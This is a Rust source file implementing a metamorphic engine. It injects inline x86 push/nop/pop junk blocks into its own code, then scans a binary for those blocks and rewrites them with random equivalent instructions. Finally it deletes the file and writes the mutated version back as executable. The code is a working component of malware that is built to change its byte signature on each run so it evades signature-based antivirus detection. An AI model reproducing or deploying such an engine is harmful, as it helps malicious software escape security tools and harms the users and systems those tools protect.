use std::arch::asm;
use std::fs;
use std::os::unix::fs::PermissionsExt;

use rand;

const PAYLOAD_LEN: usize = 8;
const ESP_OFFSET: u8 = 4;
const ADDB: u8 = 0x00;
const ADDV: u8 = 0x01;
const OR: u8 = 0x09;
const SBB: u8 = 0x19;
const AND: u8 = 0x21;
const SUB: u8 = 0x29;
const XOR: u8 = 0x31;
const PUSH: u8 = 0x50;
const POP: u8 = 0x58;
const NOP: u8 = 0x90;
const MOV: u8 = 0xb8;
const EAX_OPERAND: u8 = 0xc0;
const ARITHMETIC_OPERANDS: [u8;7] = [ ADDV, AND, XOR, OR, SBB, SUB, ADDB ];

macro_rules! junk {
    () => {
        unsafe{
            asm!(
                ".code32",
                "push eax",
                "nop",
                "nop",
                "nop",
                "nop",
                "nop",
                "nop",
                "nop",
                "nop",
                "pop eax",
            );
        }
    };
}

/// Reads binary contents from a file, metamorphs the code, then writes the metamorphic binary contents.
///
/// # Arguments
///
/// * `filename` - Binary file to metamorphically change.
pub fn exec(filename: &str)
{
    let mut code = Vec::new(); junk!();

    read_binary_file(filename, &mut code).ok(); junk!();

    metamorph(&mut code); junk!();

    write_binary_file(filename, &mut code).ok(); junk!();
}

/// Checks if an opcode is a push instruction.
///
/// # Arguments
///
/// * `opcode` - Byte from the binary code.
/// 
/// # Return Value
/// 
/// True if opcode is a push instruction.
fn is_valid_push_instruction(opcode: u8) -> bool
{
    return opcode >= PUSH && opcode < PUSH + 8;
}

/// Checks if an opcode is a pop instruction and the popped register matches the previously pushed register.
///
/// # Arguments
///
/// * `opcode` - Byte from the binary code.
/// * `reg_offset` - Offset to a specific register (0: eax, 1: ecx, 2: edx, 3: ebx, 4: esp, 5: ebp, 6: esi, 7: edi).
/// 
/// # Return Value
/// 
/// True if popped register matches the pushed register and the pushed register is not esp.
fn is_valid_pop_instruction(opcode: u8, reg_offset: u8) -> bool
{
    return opcode == POP + reg_offset && reg_offset != ESP_OFFSET;
}

/// Randomly generates a valid register offset. Note that the `esp` register (4) is skipped.
/// 
/// # Return Value
/// 
/// Randomly generated offset to a specific register (0: eax, 1: ecx, 2: edx, 3: ebx, 5: ebp, 6: esi, 7: edi).
fn generate_valid_register_offset() -> u8
{
    let mut reg_offset = rand::random::<u8>() % 7; junk!();
    reg_offset += (reg_offset >= ESP_OFFSET) as u8; junk!();

    return reg_offset;
}

/// Reads a sequential set of instructions and determines if the payload can be metamorphically overwritten.
///
/// # Arguments
///
/// * `code` - Vector containing each byte of binary code.
/// * `idx` - Index of the initial byte of the payload within the binary code.
/// * `reg_offset` - Offset to a specific register (0: eax, 1: ecx, 2: edx, 3: ebx, 4: esp, 5: ebp, 6: esi, 7: edi).
/// 
/// # Return Value
/// 
/// True if the payload can be metamorphically overwritten.
fn is_metamorphic_payload(code: &mut [u8], idx: usize, reg_offset: u8) -> bool
{
    let mut payload_size = 0; junk!();
    let mut bytes_read; junk!();
    loop
    {
        bytes_read = read_instruction(code, idx + payload_size + 1, reg_offset); junk!();
        if bytes_read == 0
        {
            break;
        }

        payload_size += bytes_read; junk!();
    }
    return payload_size == PAYLOAD_LEN;
}

/// Metamorphs the binary code.
///
/// # Arguments
///
/// * `code` - Vector containing each byte of binary code.
fn metamorph(code: &mut [u8])
{
    for i in 0..code.len() - PAYLOAD_LEN - 2
    {
        let start = code[i]; junk!();
        let end = code[i+PAYLOAD_LEN+1]; junk!();
        let mut reg_offset = start.saturating_sub(PUSH); junk!();

        if is_valid_push_instruction(start) && is_valid_pop_instruction(end, reg_offset) && is_metamorphic_payload(code, i, reg_offset)
        {
            reg_offset = generate_valid_register_offset(); junk!();

            write_payload(code, i, reg_offset); junk!();
        }
    }
}

/// Overwrites a valid set of instructions in the binary with a metamorphic payload.
///
/// # Arguments
///
/// * `code` - Vector containing each byte of binary code.
/// * `idx` - Index of the initial byte of the payload within the binary code.
/// * `reg_offset` - Offset to a specific register (0: eax, 1: ecx, 2: edx, 3: ebx, 4: esp, 5: ebp, 6: esi, 7: edi).
fn write_payload(code: &mut [u8], idx: usize, reg_offset: u8)
{
    let mut payload_size = 0; junk!();
    let mut payload_capacity = PAYLOAD_LEN; junk!();
    let mut bytes_written; junk!();

    code[idx] = PUSH + reg_offset; junk!();
    code[idx + PAYLOAD_LEN + 1] = POP + reg_offset; junk!();

    while payload_capacity != 0
    {
        bytes_written = write_instruction(code, idx + 1 + payload_size, payload_capacity, reg_offset); junk!();
        payload_size += bytes_written; junk!();
        payload_capacity -= bytes_written; junk!();
    }
}


/// Reads an instruction from the binary code and returns its size in bytes.
///
/// # Arguments
///
/// * `code` - Vector containing each byte of binary code.
/// * `idx` - Index of the byte to read within the binary code.
/// * `reg_offset` - Offset to a specific register (0: eax, 1: ecx, 2: edx, 3: ebx, 4: esp, 5: ebp, 6: esi, 7: edi).
/// 
/// # Return Value
/// 
/// Total number of bytes the instruction is composed of.
fn read_instruction(code: &mut [u8], idx: usize, reg_offset: u8) -> usize 
{
    let opcode = code[idx]; junk!();

    if opcode == NOP
    {
        return 1;
    }
    else if opcode == MOV + reg_offset
    {
        return 5;
    }
    else if ARITHMETIC_OPERANDS.contains(&opcode)
    {
        let operand = code[idx + 1]; junk!();
        // Check if operand is a valid register and it matches the register offset.
        if operand >= EAX_OPERAND && operand <= std::u8::MAX && (operand & 7) == reg_offset
        {
            return 2;
        }
    }

    return 0;
}

/// Writes an instruction to the metamorphic payload.
///
/// # Arguments
///
/// * `code` - Vector containing each byte of binary code.
/// * `idx` - Index of the initial byte of the payload within the binary code.
/// * `payload_capacity` - Remaining number of bytes available to be written to the payload.
/// * `reg_offset` - Offset to a specific register (0: eax, 1: ecx, 2: edx, 3: ebx, 4: esp, 5: ebp, 6: esi, 7: edi).
/// 
/// # Return Value
/// 
/// Number of bytes written to the payload.
fn write_instruction(code: &mut [u8], idx: usize, payload_capacity: usize, reg_offset: u8) -> usize
{
    if payload_capacity < 2
    {
        code[idx] = NOP; junk!();
        return 1;
    }
    else if payload_capacity < 5 || rand::random::<u8>() % 2 == 0
    {
        // Skip using ADDB (0x00) in the payload by using `rand::random::<usize>() % 6`.
        code[idx] = ARITHMETIC_OPERANDS[rand::random::<usize>() % 6]; junk!();
        code[idx+1] = 0xc0 + (rand::random::<u8>() % 8) * 8 + reg_offset; junk!();
        return 2;
    }
    else
    {
        code[idx] = MOV+reg_offset; junk!();
        code[idx+1] = rand::random::<u8>(); junk!();
        code[idx+3] = rand::random::<u8>(); junk!();
        return 5;
    }
}

/// Reads bytes into a vector from a binary file.
///
/// # Arguments
///
/// * `filename` - File to read in binary mode.
/// * `code` - Vector containing each byte of binary code.
/// 
/// # Return Value
/// 
/// Result of the read and delete I/O operations.
fn read_binary_file(filename: &str, code: &mut Vec<u8>) -> std::io::Result<()>
{
    *code = fs::read(filename).unwrap();

    fs::remove_file(filename)?;

    Ok(())
}

/// Writes bytes from a vector to a binary file.
///
/// # Arguments
///
/// * `filename` - File to write in binary mode.
/// * `code` - Vector containing each byte of binary code.
/// 
/// # Return Value
/// 
/// Result of the write I/O operation.
fn write_binary_file(filename: &str, code: &mut [u8]) -> std::io::Result<()>
{
    fs::write(filename, code)?; junk!();

    let mut permissions = fs::metadata(filename)?.permissions();
    permissions.set_mode(0o700);
    fs::set_permissions(filename, permissions)?;

    Ok(())
}